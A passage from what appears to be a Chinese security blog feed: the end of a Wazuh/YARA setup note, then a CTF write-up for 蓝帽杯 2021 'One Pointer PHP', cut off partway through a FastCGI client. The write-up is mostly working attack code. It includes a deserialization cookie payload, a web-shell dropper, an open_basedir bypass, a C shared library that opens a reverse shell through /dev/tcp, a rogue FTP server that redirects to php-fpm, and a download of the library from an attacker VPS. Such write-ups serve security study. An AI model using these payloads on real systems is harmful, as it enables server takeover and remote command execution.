<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoder</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>yara_decoder1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">></span></span>yara_decoder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>regex</span><span class="token punctuation">></span></span>wazuh-yara: (\S+) - Scan result: (\S+) (\S+)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>regex</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>order</span><span class="token punctuation">></span></span>log_type, yara_rule, yara_scanned_file<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>order</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoder</span><span class="token punctuation">></span></span></code></pre>

<p>流程是，通过监控<code>/home/yara/malware/</code>目录中的文件添加和修改动作，然后触发<code>yara command</code>执行sh脚本，写内容到endpoint的<code>/var/ossec/logs/active-responses.log</code>文件，wazuh监控到log文件的变化，读取后通过yara_decoder解析内容，匹配到后以一个新的<code>rule.group</code>为<code>yara</code>的组显示到<code>Kibana</code>界面上</p>
<p>至此流程拉通</p>
<p>Wazuh还有很多功能需要探索</p>
<p>能把官方文档看明白，wazuh就算入门了</p>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>Wazuh</tag>
        <tag>Yara</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝帽杯_2021_One_Pointer_PHP</title>
    <url>/posts/3ed094c3/</url>
    <content><![CDATA[<p>题目给了两个文件</p>
<p><code>add_api.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"user.php"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
	<span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span>
	<span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><code>user.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<h3 id="PHP-数组溢出"><a href="#PHP-数组溢出" class="headerlink" title="PHP 数组溢出"></a>PHP 数组溢出</h3><p>主要考查反序列化和php数组溢出绕过，关于php数组溢出可以参考：<a href="https://two.github.io/2015/09/15/PHP-array-hash-key-overflow/">PHP数组的key溢出问题</a></p>
<p>直接给出<code>payload</code></p>
<pre class="language-none"><code class="language-none">?backdoor&#x3D;file_put_contents(&quot;1.php&quot;,&quot;&lt;?php @eval(\$_POST[1])?&gt;&quot;);
Cookie: data&#x3D;O%3a4%3a&quot;User&quot;%3a1%3a&#123;s%3a5%3a&quot;count&quot;%3bi%3a9223372036854775806%3b&#125;</code></pre>

<p>查看<code>phpinfo</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%93%9D%E5%B8%BD%E6%9D%AF_2021_One_Pointer_PHP/image-20211207145434342.png" alt loading="lazy"></p>
<pre class="language-none"><code class="language-none">disable_classes:	Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException    Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException
disable_functions:	stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive</code></pre>

<p>可以通过</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;b>open_basedir : %s &lt;/b>&lt;br />'</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// normal files</span>
<span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// special files (starting with a dot(.))</span>
<span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///.*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">sort</span><span class="token punctuation">(</span><span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$file_list</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$f</span><span class="token punctuation">&#125;</span></span>&lt;br/>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>列根目录</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%93%9D%E5%B8%BD%E6%9D%AF_2021_One_Pointer_PHP/image-20211207145739940.png" alt loading="lazy"></p>
<p>限制了<code>open_basedir</code>为 <code>/var/www/html</code></p>
<p>利用<code>chdir()</code>与<code>ini_set()</code>组合来绕过，当然这个操作首先需要拥有当前目录写权限，或者存在一个可以cd进去的子目录</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>读文件</p>
<p>但是并读不到flag文件，估计权限不够</p>
<h3 id="攻击-php-fpm绕disable-functions"><a href="#攻击-php-fpm绕disable-functions" class="headerlink" title="攻击 php-fpm绕disable_functions"></a>攻击 php-fpm绕disable_functions</h3><p>读取<code>/proc/self/cmdline</code>，发现当前进程是 <code>php-fpm</code>，读取<code>/etc/nginx/sites-available/default</code>文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%93%9D%E5%B8%BD%E6%9D%AF_2021_One_Pointer_PHP/image-20211207151626495.png" alt loading="lazy"></p>
<p><code>php-fpm</code> 绑定在了本地 <code>9001</code> 端口</p>
<p>于是我们可以构造恶意代码利用<code>ssrf</code>攻击本地的<code>php-fpm</code>，通过在<code>vps</code>上搭建恶意的<code>ftp</code>，骗取目标主机将<code>payload</code>转发到自己的<code>9001</code>端口上，从而执行命令，当然这里直接用<code>curl</code>配合<code>gopher</code>协议也可以直接打，就不需要<code>ftp</code>了，但是好像并打不通</p>
<p>原理如下</p>
<p>通过eval()构造一下代码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<blockquote>
<p>FTP 协议允许通过 TCP 发送二进制数据包，更准确的说是该协议的被动模式，即：如果一个客户端试图从FTP服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口，如果它愿意的话。</p>
</blockquote>
<p>如果我们传入 <code>?file=ftp://evil-server/file.txt&amp;data=payload</code> ，会发生以下情况：</p>
<blockquote>
<p>首先通过 file_put_contents() 函数连接到我们的FTP服务器，并试图使用 file_put_contents() 把文件上传上去。但是我们搭建的恶意的ftp服务器将告诉它把文件发送到 127.0.0.1:9000。这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF了。</p>
</blockquote>
<p>写一个<code>so</code>扩展</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/ip/2333 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>编译</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gcc a.c -fPIC -shared -o a.so</code></pre>

<p>上传到服务器</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a.so'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>获取到<code>so</code>文件，<code>base64</code>编码后的内容</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a.so'</span><span class="token punctuation">,</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>使用刚才的<code>1.php</code>将<code>a.so</code>文件写到服务器；</p>
<p>也可以这样写，直接从vps下载</p>
<pre class="language-php" data-language="php"><code class="language-php">add_api<span class="token operator">.</span>php<span class="token operator">?</span>backdoor<span class="token operator">=</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'http://ip/a.so'</span></code></pre>

<p>在自己<code>vps</code>搭一个恶意的<code>ftp</code>服务器，使用的是 <code>FTP</code> 协议的被动模式</p>
<p><code>ftp_server.py</code></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> 
s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n'</span><span class="token punctuation">)</span> <span class="token comment">#STOR / (2)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>使用以下脚本生成攻击 <code>php-fpm</code>的 <code>payload</code>，<a href="https://php.okawhio.repl.co/static/2.py">https://php.okawhio.repl.co/static/2.py</a></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */</span>
<span class="token comment">/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron &lt;pierrick@webstart.fr>
 * @version     1.0
 */</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">FCGIClient</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_CONNS'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_REQS'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token string single-quoted-string">'MPXS_CONNS'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Socket
     * @var Resource
     */</span>
    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Host
     * @var String
     */</span>
    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Port
     * @var Integer
     */</span>
    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Keep Alive
     * @var Boolean
     */</span>
    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/**
     * Create a connection to the FastCGI application
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */</span>
